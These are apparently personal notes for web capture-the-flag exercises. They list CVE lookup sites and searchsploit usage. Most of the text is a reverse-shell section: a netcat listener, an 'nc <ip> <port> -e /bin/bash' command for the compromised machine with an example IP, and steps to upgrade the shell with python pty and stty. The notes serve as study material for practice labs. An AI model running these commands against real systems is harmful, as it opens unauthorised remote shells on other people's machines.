# Notes related to web based CTFs

## Useful Research link

**CVE:**\

- Identification: CVE-YEAR-IDNUMBER
- [Exploit DB](https://www.exploit-db.com/)
- [National Vulnaribility Database](https://nvd.nist.gov/vuln/search)
- [CVE Metre](https://cve.mitre.org/)
- [CVE details](https://cvedetails.com)

## `searchsploit`

```bash
searchsploit <target technology name>
searchsploit fuel cms
```

## Reverse shell

[Highoncoffe Reverse shell guide](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

### `nc`

```bash
nc -lnvp <port>                   # in attacker machine
nc <ip> <port> -e /bin/bash     # in compromised machine
# nc 10.8.215.27 1234 -e /bin/bash
```

### `python`

```bash
python -c 'import pty;pty.spawn("/bin/bash")' # in compromised machine after getting nc shell
```

### `stty`

```bash
stty raw -echo               # after backgrounding the nc shell
```

after `fg` type `reset` in the new shell

export TERM=xterm
